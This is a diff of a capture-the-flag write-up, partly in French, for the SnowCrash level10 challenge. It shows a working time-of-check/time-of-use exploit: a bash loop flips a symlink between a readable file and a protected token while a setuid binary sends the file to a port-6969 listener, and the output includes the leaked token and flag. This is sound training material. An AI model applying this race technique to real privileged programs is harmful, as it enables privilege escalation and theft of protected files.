@@ -3,25 +3,30 @@
 </br></br>
 
 ## file list in home
+
 ```zsh
 level10@SnowCrash:~$ ls -l
 total 16
 -rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
 -rw-------  1 flag10 flag10     26 Mar  5  2016 token
 ```
+
 </br></br>
 
 ## execute file level10
+
 ```zsh
-level10@SnowCrash:~$ ./level10 
+level10@SnowCrash:~$ ./level10
 ./level10 file host
         sends file to host if you have access to it
 ```
+
 </br></br>
 
 ## ltrace level10
+
 ```zsh
-level10@SnowCrash:~$ ltrace ./level10 
+level10@SnowCrash:~$ ltrace ./level10
 __libc_start_main(0x80486d4, 1, 0xbffff7f4, 0x8048970, 0x80489e0 <unfinished ...>
 printf("%s file host\n\tsends file to ho"..., "./level10"./level10 file host
         sends file to host if you have access to it
@@ -29,9 +34,11 @@ printf("%s file host\n\tsends file to ho"..., "./level10"./level10 file host
 exit(1 <unfinished ...>
 +++ exited (status 1) +++
 ```
+
 </br></br>
 
 ## strings level10
+
 ```zsh
 ...
 ...
@@ -40,20 +47,21 @@ UWVS
 [^_]
 %s file host
         sends file to host if you have access to it
-Connecting to %s:6969 .. 
+Connecting to %s:6969 ..
 Unable to connect to host %s
 .*( )*.
 Unable to write banner to host %s
 Connected!
-Sending file .. 
+Sending file ..
 Damn. Unable to open file
 ...
 ...
 ```
-Connection to 6969. we need to listen on port 6969
+
+Connecter à 6969, on a besoin d'écouter la porte 6969
 
 ```zsh
-level10@SnowCrash:~$ ./level10 
+level10@SnowCrash:~$ ./level10
 ./level10 file host
         sends file to host if you have access to it
 level10@SnowCrash:~$ ./level10 token localhost
@@ -71,6 +79,7 @@ on peut voir que level10 utilise access
 </br></br>
 
 ## access
+
 ```zsh
 level10@SnowCrash:~$ man access
 ...
@@ -92,6 +101,7 @@ par contre, on peut ouvrir level10
 level10@SnowCrash:~$ ./level10 level10 localhost
 Connecting to localhost:6969 .. Unable to connect to host localhost
 ```
+
 donc, on va executer token en utilisant race condition et symbolic link
 
 </br></br>
@@ -105,10 +115,10 @@ ce fichier est symbolic link pour open (level10) et pour executer (token)
 level10@SnowCrash:/tmp/link$ vim makeSymLink.sh
 level10@SnowCrash:/tmp/link$ ls
 makeSymLink.sh
-level10@SnowCrash:/tmp/link$ chmod +x ./makeSymLink.sh 
-level10@SnowCrash:/tmp/link$ ./makeSymLink.sh 
-level10@SnowCrash:/tmp/link$ cat makeSymLink.sh 
+level10@SnowCrash:/tmp/link$ chmod +x ./makeSymLink.sh
+level10@SnowCrash:/tmp/link$ ./makeSymLink.sh
 ```
+
 ```sh
 #!/bin/bash
 
@@ -118,15 +128,17 @@ do
   ln -fs ~/token ./link
 done
 ```
+
 </br></br>
 
-## execute 
+## execute
+
 ```zsh
-level10@SnowCrash:/tmp/link$ ./makeSymLink.sh 
+level10@SnowCrash:/tmp/link$ ./makeSymLink.sh
 ```
 
 ```zsh
-level10@SnowCrash:/tmp/link$ ./makeSymLink.sh 
+level10@SnowCrash:/tmp/link$ ./makeSymLink.sh
 Connecting to 192.168.56.101:6969 .. Unable to connect to host 192.168.56.101
 You don't have access to /tmp/link/link
 Connecting to 192.168.56.101:6969 .. Unable to connect to host 192.168.56.101
@@ -161,16 +173,18 @@ woupa2yuojeeaaed06riuj63c
 woupa2yuojeeaaed06riuj63c
 .*( )*.
 ```
+
 </br></br>
 
 ## get token
+
 ```zsh
 level10@SnowCrash:~$ su flag10
-Password: 
+Password:
 Don't forget to launch getflag !
 flag10@SnowCrash:~$ getflag
 Check flag.Here is your token : feulo4b72j7edeahuete3no7c
 flag10@SnowCrash:~$ su level11
-Password: 
-level11@SnowCrash:~$ 
+Password:
+level11@SnowCrash:~$
 ```
